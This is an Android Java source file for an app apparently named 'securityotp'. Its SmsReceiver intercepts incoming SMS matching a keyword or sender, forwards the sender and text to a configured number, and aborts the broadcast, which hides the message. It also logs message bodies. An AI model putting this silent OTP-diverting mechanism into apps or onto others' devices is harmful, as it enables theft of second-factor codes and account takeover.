package com.devspark.securityotp;

import java.util.ArrayList;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

/**
 * 
 * @author e.shishkin
 * 
 */
public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = SmsReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        SmsMessage sms = getSmsMessage(bundle);

        String keyWord = context.getString(R.string.key_word);
        String keyChar = context.getString(R.string.key_char);
        String keyNumber = context.getString(R.string.key_number);
        try {
            // check on the key rules intercept sms
            if (!TextUtils.isEmpty(keyWord) && !sms.getMessageBody().contains(keyWord)) {
                return;
            }
            if (!TextUtils.isEmpty(keyChar) && !sms.getMessageBody().contains(keyChar)) {
                return;
            }
            if (!TextUtils.isEmpty(keyNumber) && !sms.getOriginatingAddress().equals(keyNumber)) {
                return;
            }

            forwardSms(context, sms);
            abortBroadcast();
        } catch (Exception e) {
            Log.e(TAG, "Don't forward sms: " + sms.getMessageBody(), e);
        }
    }

    /**
     * Extract sms message from bundle.
     * 
     * @param bundle
     * @return sms message
     */
    private SmsMessage getSmsMessage(Bundle bundle) {
        Object messages[] = (Object[]) bundle.get("pdus");
        SmsMessage smsMessage[] = new SmsMessage[messages.length];
        for (int n = 0; n < messages.length; n++) {
            smsMessage[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
        }
        return smsMessage[0];
    }

    /**
     * Forwarding sms message.
     * 
     * @param context
     * @param sms
     */
    private void forwardSms(Context context, SmsMessage sms) {
        String forwardNumber = context.getString(R.string.forward_number);
        String smsText = String.format("From: %s\nMessage: %s", sms.getOriginatingAddress(), sms.getMessageBody());
        Log.i(TAG, String.format("Forward SMS: number=[%s], message=[%s], length=[%d]", forwardNumber, smsText, smsText.length()));
        // send receive SMS to the FORWARD_NUMBER
        SmsManager smsManager = SmsManager.getDefault();
        ArrayList<String> parts = smsManager.divideMessage(smsText);
        smsManager.sendMultipartTextMessage(forwardNumber, null, parts, null, null);
    }

}
